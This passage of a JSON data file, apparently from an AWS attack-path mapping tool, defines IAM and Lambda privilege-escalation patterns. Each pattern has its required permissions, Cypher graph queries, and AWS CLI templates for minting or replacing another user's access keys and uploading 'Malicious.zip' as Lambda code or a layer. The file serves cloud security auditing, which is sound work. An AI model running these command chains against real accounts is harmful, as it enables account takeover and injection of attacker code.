SET  edge.Description = \"Changes the password for the specified IAM user.\", edge.Commands = commands, edge.Weight = SIZE(commands) "
  },
  "CreateUserAccessKey": {
    "Description": "Creates a new AWS secret access key and corresponding AWS access key ID for the specified user.",
    "Commands": [
      "aws iam create-access-key --user-name ${AWS::IAM::User} "
    ],
    "Attack": {
      "Requires": [
        "iam:CreateAccessKey"
      ],
      "Affects": "AWS::IAM::User",
      "Cypher": [
        "(COALESCE(SIZE(SPLIT(${AWS::IAM::User}.AccessKeys,'Status')), 1) - 1) < 2"
      ]
    },
    "Grants": "CreateAccessKey",
    "CYPHER": "OPTIONAL MATCH (ADMIN:Resource) WHERE (ADMIN)-[:ATTACK*0..2]->(:Admin) OR (ADMIN)-[:ATTACK]->(:Pattern)-[:ADMIN]->() OPTIONAL MATCH (admin:Resource)-[:ATTACK|TRANSITIVE*0..]->(ADMIN)  WITH  [[NULL, []]] AS options, REDUCE(admins=[], _ IN COLLECT(admin)|CASE WHEN _ IN admins THEN admins ELSE admins + _ END) AS admin  , [NULL, []] AS grants MATCH path=(source:`Resource`)-[edge{Name:'iam:CreateAccessKey', Effect: 'Allow'}]->(target:`AWS::IAM::User`)  WHERE ALL(_ IN REVERSE(TAIL(REVERSE(NODES(path)))) WHERE NOT _ IN admin)  AND edge.Conditions IS NULL  AND (COALESCE(SIZE(SPLIT(target.AccessKeys,'Status')), 1) - 1) < 2 WITH source, target, [] AS commands, options, grants OPTIONAL MATCH (source)-[:TRANSITIVE|ATTACK*0..]->()-->(:Pattern)-[edge:CREATE]->(target:Generic) WITH source, target, options, grants, REDUCE(commands=[], _ IN commands + COALESCE(edge.Commands,[])| CASE WHEN _ IN commands THEN commands  ELSE commands + _ END ) AS commands WHERE (NOT edge IS NULL AND target:Generic) OR target:Resource WITH DISTINCT source, target, options, grants, COALESCE(commands, []) AS commands ORDER BY SIZE(commands) WITH source, target, commands, options, grants ORDER BY SIZE(commands) WITH DISTINCT source, options, COLLECT([target, commands]) AS grants  MERGE (source)-[:ATTACK{Name:'CreateUserAccessKey'}]-> (pattern:Pattern:CreateUserAccessKey{Name:'CreateUserAccessKey'}) ON CREATE SET  pattern.Requires = ['iam:CreateAccessKey'], pattern.Depends = \"\" WITH DISTINCT pattern, options, grants UNWIND grants AS grant WITH pattern, options, grant[0] AS grant, options[0][0] AS option, REDUCE(commands=[], _ IN options[0][1] + grant[1]| CASE WHEN _ IN commands THEN commands ELSE commands + _ END ) AS history WITH pattern, options, grant, option,  REDUCE(commands=[], _ IN history + EXTRACT(_ IN ['aws iam create-access-key --user-name ${AWS::IAM::User} ']|REPLACE(_, \"${AWS::IAM::User}\", grant.Name))|CASE WHEN _ IN commands THEN commands ELSE commands + _ END) AS commands MERGE (pattern)-[edge:ATTACK{Name:'CreateAccessKey'}]->(grant) ON CREATE SET  edge.Description = \"Creates a new AWS secret access key and corresponding AWS access key ID for the specified user.\", edge.Commands = commands, edge.Weight = SIZE(commands) "
  },
  "ReplaceUserAccessKey": {
    "Description": "Replaces the AWS secret access key and corresponding AWS access key ID for the specified user.",
    "Commands": [
      "aws iam delete-access-key --user-name ${AWS::IAM::User} --access-key-id $access-key-id",
      "aws iam create-access-key --user-name ${AWS::IAM::User} "
    ],
    "Attack": {
      "Requires": [
        "iam:DeleteAccessKey",
        "iam:CreateAccessKey"
      ],
      "Affects": "AWS::IAM::User",
      "Cypher": [
        "(SIZE(SPLIT(${AWS::IAM::User}.AccessKeys,'Status')) - 1) > 0"
      ]
    },
    "Grants": "ReplaceAccessKey",
    "CYPHER": "OPTIONAL MATCH (ADMIN:Resource) WHERE (ADMIN)-[:ATTACK*0..2]->(:Admin) OR (ADMIN)-[:ATTACK]->(:Pattern)-[:ADMIN]->() OPTIONAL MATCH (admin:Resource)-[:ATTACK|TRANSITIVE*0..]->(ADMIN)  WITH  [[NULL, []]] AS options, REDUCE(admins=[], _ IN COLLECT(admin)|CASE WHEN _ IN admins THEN admins ELSE admins + _ END) AS admin  , [NULL, []] AS grants MATCH path=(source:`Resource`)-[:TRANSITIVE|ATTACK*0..]->()-[edge]->(target:`AWS::IAM::User`) WHERE ALL(_ IN REVERSE(TAIL(REVERSE(NODES(path)))) WHERE NOT _ IN admin) AND edge.Name IN ['iam:DeleteAccessKey', 'iam:CreateAccessKey'] AND edge.Effect = 'Allow'  AND edge.Conditions IS NULL  AND (SIZE(SPLIT(target.AccessKeys,'Status')) - 1) > 0 WITH COLLECT([source, edge.Name, target, path, options, grants]) AS results UNWIND results AS result WITH results, result[0] AS source, result[1] AS edge, result[2] AS target WITH results, source, SIZE(COLLECT(DISTINCT edge)) AS size, target WHERE size = 2 WITH results, target,  COLLECT(DISTINCT source) AS sources  WITH results,  COLLECT(DISTINCT [target, sources]) AS pairs  UNWIND pairs AS pair  UNWIND results AS result  WITH results,  result[0] AS source, result[2] AS target,  pair[0] AS t, pair[1] AS s,  TAIL(REVERSE(TAIL(NODES(result[3])))) AS intermediaries  WHERE ALL(_ IN intermediaries WHERE NOT _ IN s)  AND target = t  WITH source, target, results  UNWIND results AS result WITH source, target, result WHERE result[0] = source AND result[2] = target WITH result[0] AS source, result[2] AS target,  result[3] AS path, result[4] AS options,  result[5] AS grants  WITH source, target, options, grants, FILTER(_ IN RELS(path) WHERE STARTNODE(_):Pattern) AS dependencies, LAST(EXTRACT(_ IN RELS(path)|_.Name)) AS outcome WITH COLLECT([source, target, options, outcome, REDUCE(commands=[], _ IN dependencies| CASE WHEN _ IN commands THEN commands  ELSE commands + _.Commands END), grants] ) AS results UNWIND results AS result WITH results, result[0] AS source, result[1] AS target, result[3] AS outcome, MIN(SIZE(result[4])) AS weight UNWIND results AS result WITH result, source, target, outcome, weight WHERE source = result[0] AND target = result[1] AND outcome = result[3] AND weight = SIZE(result[4]) WITH source, target, REDUCE(commands=[], _ IN COLLECT(result[4])| CASE WHEN _ IN commands THEN commands ELSE _ + commands END) AS commands, result[2] AS options, result[5] AS grants OPTIONAL MATCH (source)-[:TRANSITIVE|ATTACK*0..]->()-->(:Pattern)-[edge:CREATE]->(target:Generic) WITH source, target, options, grants, REDUCE(commands=[], _ IN commands + COALESCE(edge.Commands,[])| CASE WHEN _ IN commands THEN commands  ELSE commands + _ END ) AS commands WHERE (NOT edge IS NULL AND target:Generic) OR target:Resource WITH DISTINCT source, target, options, grants, COALESCE(commands, []) AS commands ORDER BY SIZE(commands) WITH source, target, commands, options, grants ORDER BY SIZE(commands) WITH DISTINCT source, options, COLLECT([target, commands]) AS grants  MERGE (source)-[:ATTACK{Name:'ReplaceUserAccessKey'}]-> (pattern:Pattern:ReplaceUserAccessKey{Name:'ReplaceUserAccessKey'}) ON CREATE SET  pattern.Requires = ['iam:DeleteAccessKey', 'iam:CreateAccessKey'], pattern.Depends = \"\" WITH DISTINCT pattern, options, grants UNWIND grants AS grant WITH pattern, options, grant[0] AS grant, options[0][0] AS option, REDUCE(commands=[], _ IN options[0][1] + grant[1]| CASE WHEN _ IN commands THEN commands ELSE commands + _ END ) AS history WITH pattern, options, grant, option,  REDUCE(commands=[], _ IN history + EXTRACT(_ IN ['aws iam delete-access-key --user-name ${AWS::IAM::User} --access-key-id $access-key-id', 'aws iam create-access-key --user-name ${AWS::IAM::User} ']|REPLACE(REPLACE(_, \"${AWS::IAM::User}\", grant.Name), \"${AWS::IAM::User}\", grant.Name))|CASE WHEN _ IN commands THEN commands ELSE commands + _ END) AS commands MERGE (pattern)-[edge:ATTACK{Name:'ReplaceAccessKey'}]->(grant) ON CREATE SET  edge.Description = \"Replaces the AWS secret access key and corresponding AWS access key ID for the specified user.\", edge.Commands = commands, edge.Weight = SIZE(commands) "
  },
  "UpdateFunctionCode": {
    "Description": "Replaces the lambda function with user specified code.",
    "Commands": [
      "aws lambda update-function-code --function-name ${AWS::Lambda::Function} --zip-file Malicious.zip"
    ],
    "Attack": {
      "Requires": [
        "lambda:UpdateFunctionCode"
      ],
      "Affects": "AWS::Lambda::Function"
    },
    "Grants": "AddPermission",
    "CYPHER": "OPTIONAL MATCH (ADMIN:Resource) WHERE (ADMIN)-[:ATTACK*0..2]->(:Admin) OR (ADMIN)-[:ATTACK]->(:Pattern)-[:ADMIN]->() OPTIONAL MATCH (admin:Resource)-[:ATTACK|TRANSITIVE*0..]->(ADMIN)  WITH  [[NULL, []]] AS options, REDUCE(admins=[], _ IN COLLECT(admin)|CASE WHEN _ IN admins THEN admins ELSE admins + _ END) AS admin  , [NULL, []] AS grants MATCH path=(source:`Resource`)-[edge{Name:'lambda:UpdateFunctionCode', Effect: 'Allow'}]->(target:`AWS::Lambda::Function`)  WHERE ALL(_ IN REVERSE(TAIL(REVERSE(NODES(path)))) WHERE NOT _ IN admin)  AND edge.Conditions IS NULL   WITH source, target, [] AS commands, options, grants OPTIONAL MATCH (source)-[:TRANSITIVE|ATTACK*0..]->()-->(:Pattern)-[edge:CREATE]->(target:Generic) WITH source, target, options, grants, REDUCE(commands=[], _ IN commands + COALESCE(edge.Commands,[])| CASE WHEN _ IN commands THEN commands  ELSE commands + _ END ) AS commands WHERE (NOT edge IS NULL AND target:Generic) OR target:Resource WITH DISTINCT source, target, options, grants, COALESCE(commands, []) AS commands ORDER BY SIZE(commands) WITH source, target, commands, options, grants ORDER BY SIZE(commands) WITH DISTINCT source, options, COLLECT([target, commands]) AS grants  MERGE (source)-[:ATTACK{Name:'UpdateFunctionCode'}]-> (pattern:Pattern:UpdateFunctionCode{Name:'UpdateFunctionCode'}) ON CREATE SET  pattern.Requires = ['lambda:UpdateFunctionCode'], pattern.Depends = \"\" WITH DISTINCT pattern, options, grants UNWIND grants AS grant WITH pattern, options, grant[0] AS grant, options[0][0] AS option, REDUCE(commands=[], _ IN options[0][1] + grant[1]| CASE WHEN _ IN commands THEN commands ELSE commands + _ END ) AS history WITH pattern, options, grant, option,  REDUCE(commands=[], _ IN history + EXTRACT(_ IN ['aws lambda update-function-code --function-name ${AWS::Lambda::Function} --zip-file Malicious.zip']|REPLACE(_, \"${AWS::Lambda::Function}\", grant.Name))|CASE WHEN _ IN commands THEN commands ELSE commands + _ END) AS commands MERGE (pattern)-[edge:ATTACK{Name:'AddPermission'}]->(grant) ON CREATE SET  edge.Description = \"Replaces the lambda function with user specified code.\", edge.Commands = commands, edge.Weight = SIZE(commands) "
  },
  "AddLambdaPermission": {
    "Description": "Modifies the lambda function to grant the calling principal permission to update the function's code.",
    "Commands": [
      "aws lambda add-permission --principal <Your User ARN>--function-name ${AWS::Lambda::Function} --action lambda:UpdateFunctionCode",
      "aws lambda update-function-code --function-name ${AWS::Lambda::Function} --zip-file Malicious.zip"
    ],
    "Attack": {
      "Requires": [
        "lambda:AddPermission"
      ],
      "Affects": "AWS::Lambda::Function"
    },
    "Grants": "UpdateFunctionCode",
    "CYPHER": "OPTIONAL MATCH (ADMIN:Resource) WHERE (ADMIN)-[:ATTACK*0..2]->(:Admin) OR (ADMIN)-[:ATTACK]->(:Pattern)-[:ADMIN]->() OPTIONAL MATCH (admin:Resource)-[:ATTACK|TRANSITIVE*0..]->(ADMIN)  WITH  [[NULL, []]] AS options, REDUCE(admins=[], _ IN COLLECT(admin)|CASE WHEN _ IN admins THEN admins ELSE admins + _ END) AS admin  , [NULL, []] AS grants MATCH path=(source:`Resource`)-[edge{Name:'lambda:AddPermission', Effect: 'Allow'}]->(target:`AWS::Lambda::Function`)  WHERE ALL(_ IN REVERSE(TAIL(REVERSE(NODES(path)))) WHERE NOT _ IN admin)  AND edge.Conditions IS NULL   WITH source, target, [] AS commands, options, grants OPTIONAL MATCH (source)-[:TRANSITIVE|ATTACK*0..]->()-->(:Pattern)-[edge:CREATE]->(target:Generic) WITH source, target, options, grants, REDUCE(commands=[], _ IN commands + COALESCE(edge.Commands,[])| CASE WHEN _ IN commands THEN commands  ELSE commands + _ END ) AS commands WHERE (NOT edge IS NULL AND target:Generic) OR target:Resource WITH DISTINCT source, target, options, grants, COALESCE(commands, []) AS commands ORDER BY SIZE(commands) WITH source, target, commands, options, grants ORDER BY SIZE(commands) WITH DISTINCT source, options, COLLECT([target, commands]) AS grants  MERGE (source)-[:ATTACK{Name:'AddLambdaPermission'}]-> (pattern:Pattern:AddLambdaPermission{Name:'AddLambdaPermission'}) ON CREATE SET  pattern.Requires = ['lambda:AddPermission'], pattern.Depends = \"\" WITH DISTINCT pattern, options, grants UNWIND grants AS grant WITH pattern, options, grant[0] AS grant, options[0][0] AS option, REDUCE(commands=[], _ IN options[0][1] + grant[1]| CASE WHEN _ IN commands THEN commands ELSE commands + _ END ) AS history WITH pattern, options, grant, option,  REDUCE(commands=[], _ IN history + EXTRACT(_ IN ['aws lambda add-permission --principal <Your User ARN>--function-name ${AWS::Lambda::Function} --action lambda:UpdateFunctionCode', 'aws lambda update-function-code --function-name ${AWS::Lambda::Function} --zip-file Malicious.zip']|REPLACE(REPLACE(_, \"${AWS::Lambda::Function}\", grant.Name), \"${AWS::Lambda::Function}\", grant.Name))|CASE WHEN _ IN commands THEN commands ELSE commands + _ END) AS commands MERGE (pattern)-[edge:ATTACK{Name:'UpdateFunctionCode'}]->(grant) ON CREATE SET  edge.Description = \"Modifies the lambda function to grant the calling principal permission to update the function's code.\", edge.Commands = commands, edge.Weight = SIZE(commands) "
  },
  "UpdateFunctionConfiguration": {
    "Description": "Creates a lambda layer with user specified code, and attaches it to a function",
    "Commands": [
      "aws lambda publish-layer-version--layer-name Malicious --zip-file Malicious.zip",
      "aws lambda update-function-configuration --function-name ${AWS::Lambda::Function} --layers <[layer ARN]>"
    ],
    "Attack": {
      "Requires": [
        "lambda:UpdateFunctionConfiguration",
        "lambda:PublishLayerVersion"
      ],
      "Affects": "AWS::Lambda::Function"
    },
    "Grants": "UpdateFunctionCode",
    "CYPHER": "OPTIONAL MATCH (ADMIN:Resource) WHERE (ADMIN)-[:ATTACK*0..2]->(:Admin) OR (ADMIN)-[:ATTACK]->(:Pattern)-[:ADMIN]->() OPTIONAL MATCH (admin:Resource)-[:ATTACK|TRANSITIVE*0..]->(ADMIN)  WITH  [[NULL, []]] AS options, REDUCE(admins=[], _ IN COLLECT(admin)|CASE WHEN _ IN admins THEN admins ELSE admins + _ END) AS admin  , [NULL, []] AS grants MATCH path=(source:`Resource`)-[:TRANSITIVE|ATTACK*0..]->()-[edge]->(target:`AWS::Lambda::Function`) WHERE ALL(_ IN REVERSE(TAIL(REVERSE(NODES(path)))) WHERE NOT _ IN admin) AND edge.Name IN ['lambda:UpdateFunctionConfiguration', 'lambda:PublishLayerVersion'] AND edge.Effect = 'Allow'  AND edge.Conditions IS NULL   WITH COLLECT([source, edge.Name, target, path, options, grants]) AS results UNWIND results AS result WITH results, result[0] AS source, result[1] AS edge, result[2] AS target WITH results, source, SIZE(COLLECT(DISTINCT edge)) AS size, target WHERE size = 2 WITH results, target,  COLLECT(DISTINCT source) AS sources  WITH results,  COLLECT(DISTINCT [target, sources]) AS pairs  UNWIND pairs AS pair  UNWIND results AS result  WITH results,  result[0] AS source, result[2] AS target,  pair[0] AS t, pair[1] AS s,  TAIL(REVERSE(TAIL(NODES(result[3])))) AS intermediaries  WHERE ALL(_ IN intermediaries WHERE NOT _ IN s)  AND target = t  WITH source, target, results  UNWIND results AS result WITH source, target, result WHERE result[0] = source AND result[2] = target WITH result[0] AS source, result[2] AS target,  result[3] AS path, result[4] AS options,  result[5] AS grants  WITH source, target, options, grants, FILTER(_ IN RELS(path) WHERE STARTNODE(_):Pattern) AS dependencies, LAST(EXTRACT(_ IN RELS(path)|_.Name)) AS outcome WITH COLLECT([source, target, options, outcome, REDUCE(commands=[], _ IN dependencies| CASE WHEN _ IN commands THEN commands  ELSE commands + _.Commands END), grants] ) AS results UNWIND results AS result WITH results, result[0] AS source, result[1] AS target, result[3] AS outcome, MIN(SIZE(result[4])) AS weight UNWIND results AS result WITH result, source, target, outcome, weight WHERE source = result[0] AND target = result[1] AND outcome = result[3] AND weight = SIZE(result[4]) WITH source, target, REDUCE(commands=[], _ IN COLLECT(result[4])| CASE WHEN _ IN commands THEN commands ELSE _ + commands END) AS commands, result[2] AS options, result[5] AS grants OPTIONAL MATCH (source)-[:TRANSITIVE|ATTACK*0..]->()-->(:Pattern)-[edge:CREATE]->(target:Generic) WITH source, target, options, grants, REDUCE(commands=[], _ IN commands + COALESCE(edge.Commands,[])| CASE WHEN _ IN commands THEN commands  ELSE commands + _ END ) AS commands WHERE (NOT edge IS NULL AND target:Generic) OR target:Resource WITH DISTINCT source, target, options, grants, COALESCE(commands, []) AS commands ORDER BY SIZE(commands) WITH source, target, commands, options, grants ORDER BY SIZE(commands) WITH DISTINCT source, options, COLLECT([target, commands]) AS grants  MERGE (source)-[:ATTACK{Name:'UpdateFunctionConfiguration'}]-> (pattern:Pattern:UpdateFunctionConfiguration{Name:'UpdateFunctionConfiguration'}) ON CREATE SET  pattern.Requires = ['lambda:UpdateFunctionConfiguration', 'lambda:PublishLayerVersion'], pattern.Depends = \"\" WITH DISTINCT pattern, options, grants UNWIND grants AS grant WITH pattern, options, grant[0] AS grant, options[0][0] AS option, REDUCE(commands=[], _ IN options[0][1] + grant[1]| CASE WHEN _ IN commands THEN commands ELSE commands + _ END ) AS history WITH pattern, options, grant, option,  REDUCE(commands=[], _ IN history + EXTRACT(_ IN ['aws lambda publish-layer-version--layer-name Malicious --zip-file Malicious.zip', 'aws lambda update-function-configuration --function-name ${AWS::Lambda::Function} --layers <[layer ARN]>']|REPLACE(_, \"${AWS::Lambda::Function}\", grant.Name))|CASE WHEN _ IN commands THEN commands ELSE commands + _ END) AS commands MERGE (pattern)-[edge:ATTACK{Name:'UpdateFunctionCode'}]->(grant) ON CREATE SET  edge.Description = \"Creates a lambda layer with user specified code, and attaches it to a function\", edge.Commands = commands, edge.Weight = SIZE(commands) "
  }
} 
}